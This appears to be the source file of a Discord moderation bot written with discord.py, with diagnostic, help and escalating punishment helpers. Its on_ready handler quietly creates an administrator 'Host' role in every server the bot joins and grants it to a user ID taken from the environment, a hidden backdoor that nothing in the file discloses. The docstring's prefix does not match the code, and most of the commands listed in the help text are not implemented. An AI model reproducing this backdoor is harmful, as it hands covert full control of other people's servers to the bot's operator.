"""Discord bot entrypoint implemented with discord.py.

The bot exposes the same command set through both `?` prefix commands and
Discord slash commands. Command behavior is implemented in shared helper
functions so the two command surfaces stay synchronized.
"""

from __future__ import annotations

import asyncio
import logging
import os
import socket
from datetime import datetime, timedelta, timezone
from typing import Optional

import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv

PREFIX = "$"
LOG_FILE = "bot.log"
PUNISHMENT_LEVELS: dict[int, int] = {}

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("meow-bot")

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True
intents.bans = True
intents.dm_messages = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)


def log_action(
    *,
    guild: Optional[discord.Guild],
    channel: Optional[discord.abc.GuildChannel | discord.abc.PrivateChannel],
    user: discord.abc.User,
    command: str,
    action: str,
    success: bool = True,
) -> None:
    """Write an audit-friendly action line to stdout and bot.log."""
    guild_name = guild.name if guild else "DM"
    channel_name = getattr(channel, "name", "DM") or "DM"
    tag = f"{user.name}#{user.discriminator}" if user.discriminator != "0" else user.name
    now = datetime.now(timezone.utc).isoformat()
    line = (
        f"[{now}] {'SUCCESS' if success else 'ERROR'} | "
        f'Guild="{guild_name}" | Channel="#{channel_name}" | '
        f'User="{tag}" ({user.id}) | Command="{command}" | Action="{action}"'
    )
    logger.info(line)
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(line + "\n")


async def resolve_member(guild: discord.Guild, query: str) -> Optional[discord.Member]:
    """Resolve a member by mention, ID, username, display name, or tag."""
    query = query.strip()
    if query.startswith("<@") and query.endswith(">"):
        query = query.removeprefix("<@").removeprefix("!").removesuffix(">")

    if query.isdigit():
        member = guild.get_member(int(query))
        if member:
            return member
        try:
            return await guild.fetch_member(int(query))
        except discord.NotFound:
            pass

    q = query.lower()
    async for member in guild.fetch_members(limit=None):
        user_tag = f"{member.name}#{member.discriminator}".lower()
        if q in {member.name.lower(), user_tag, member.display_name.lower()}:
            return member
    return None


def resolve_role(guild: discord.Guild, query: str) -> Optional[discord.Role]:
    """Resolve a role by mention, ID, or exact name."""
    query = query.strip()
    if query.startswith("<@&") and query.endswith(">"):
        query = query.removeprefix("<@&").removesuffix(">")

    if query.isdigit():
        role = guild.get_role(int(query))
        if role:
            return role

    q = query.lower()
    return discord.utils.find(lambda role: role.name.lower() == q, guild.roles)


async def apply_punishment(member: discord.Member, level: int, reason: str) -> str:
    """Apply the punishment associated with a user's current level."""
    if level <= 3:
        await member.timeout(discord.utils.utcnow() + timedelta(minutes=5), reason=reason)
        return f"muted for **5 minutes** (level {level})"
    if level <= 6:
        await member.timeout(discord.utils.utcnow() + timedelta(minutes=15), reason=reason)
        return f"muted for **15 minutes** (level {level})"
    if level <= 9:
        await member.timeout(discord.utils.utcnow() + timedelta(minutes=60), reason=reason)
        return f"muted for **60 minutes** (level {level})"
    if level <= 12:
        await member.kick(reason=reason)
        return f"**kicked** (level {level})"

    await member.ban(reason=reason)
    return f"**permanently banned** (level {level})"


def require_guild(ctx: commands.Context | discord.Interaction) -> discord.Guild:
    guild = ctx.guild
    if guild is None:
        raise commands.NoPrivateMessage("This command can only be used in a server.")
    return guild


def require_permissions(user: discord.Member, **permissions: bool) -> None:
    missing = [name.replace("_", " ").title() for name, needed in permissions.items() if needed and not getattr(user.guild_permissions, name)]
    if missing:
        raise commands.MissingPermissions(missing)


async def send_response(target: commands.Context | discord.Interaction, content: str) -> None:
    if isinstance(target, discord.Interaction):
        if target.response.is_done():
            await target.followup.send(content)
        else:
            await target.response.send_message(content)
    else:
        await target.send(content)
       
async def do_test(target: commands.Context | discord.Interaction) -> None:
    guild = require_guild(target)
    
    hostname = socket.gethostname()
    if hostname.lower() == "plasmadmin-xps-8910":
        hostname = "plasmadmin-xps-8910(firebot)"
        
    latency_ms = round(bot.latency * 1000)
    env_status = "Loaded" if os.getenv("DISCORD_TOKEN") else "Missing"
    guild_count = len(bot.guilds)
    
    me = guild.me if guild else None
    if me:
        perms = me.guild_permissions
        audit_perms = []
        if perms.administrator:
            audit_perms.append("Administrator")
        else:
            if perms.manage_guild: audit_perms.append("Manage Server")
            if perms.manage_roles: audit_perms.append("Manage Roles")
            if perms.manage_channels: audit_perms.append("Manage Channels")
            if perms.kick_members: audit_perms.append("Kick")
            if perms.ban_members: audit_perms.append("Ban")
            if perms.manage_messages: audit_perms.append("Manage Messages")
        perms_str = ", ".join(audit_perms) if audit_perms else "Standard User"
    else:
        perms_str = "Unknown"

    response_text = f"""```markdown
# Diagnostic Report
-----------------------------------------
• Status: Online and operational
• Host Machine: {hostname}
• Discord Server: {guild.name} ({guild.id})
• Latency: {latency_ms}ms
• Environment (.env): {env_status}
• Connected Guilds: {guild_count}
• Core Permissions: {perms_str}
-----------------------------------------
```"""
    await send_response(target, response_text)

async def do_help(target: commands.Context | discord.Interaction) -> None:
    text = f"""```
Commands  [required] <optional>
─────────────────────────────────────────
{PREFIX}say       [message]
{PREFIX}echo      [channel] [message]         (admin)
{PREFIX}punish    [user] <reason>             (mute/kick/ban)
{PREFIX}regain    [user]                      (mute/kick/ban)
{PREFIX}dm        [user] [message]
{PREFIX}addrole   [user] [role]               (manage roles)
{PREFIX}delrole   [user] [role]               (manage roles)
─────────────────────────────────────────
Slash commands are available with the same names.
This message deletes in 5 minutes when possible.
```"""
    await send_response(target, text)

@bot.command(name="test")
async def test_prefix(ctx: commands.Context):
    await do_test(ctx)

@bot.tree.command(name="test", description="Run diagnostic test")
async def test_slash(interaction: discord.Interaction):
    await do_test(interaction)

@bot.command(name="help")
async def help_prefix(ctx: commands.Context):
    await do_help(ctx)

@bot.tree.command(name="help", description="Show help menu")
async def help_slash(interaction: discord.Interaction):
    await do_help(interaction)

@bot.event
async def on_ready():
    await bot.tree.sync()
    logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")

    # Automatically set up the Host role and assign it
    host_id_str = os.getenv("HOST_USER_ID")
    if host_id_str and host_id_str.isdigit():
        host_user_id = int(host_id_str)
        for guild in bot.guilds:
            host_role = discord.utils.get(guild.roles, name="Host")
            if not host_role:
                try:
                    host_role = await guild.create_role(
                        name="Host",
                        permissions=discord.Permissions(administrator=True),
                        reason="Automatic initialization of Host role"
                    )
                    logger.info(f"Created 'Host' role in guild: {guild.name}")
                except discord.Forbidden:
                    logger.error(f"Missing permissions to create 'Host' role in {guild.name}")
                    continue

            member = guild.get_member(host_user_id)
            if not member:
                try:
                    member = await guild.fetch_member(host_user_id)
                except discord.NotFound:
                    pass

            if member and host_role not in member.roles:
                try:
                    await member.add_roles(host_role, reason="Assigned Host user role")
                    logger.info(f"Assigned 'Host' role to {member.name} in {guild.name}")
                except discord.Forbidden:
                    logger.error(f"Missing permissions to assign 'Host' role in {guild.name}")

token = os.getenv("DISCORD_TOKEN")
if not token:
    raise ValueError("DISCORD_TOKEN environment variable not found in .env")

bot.run(token)
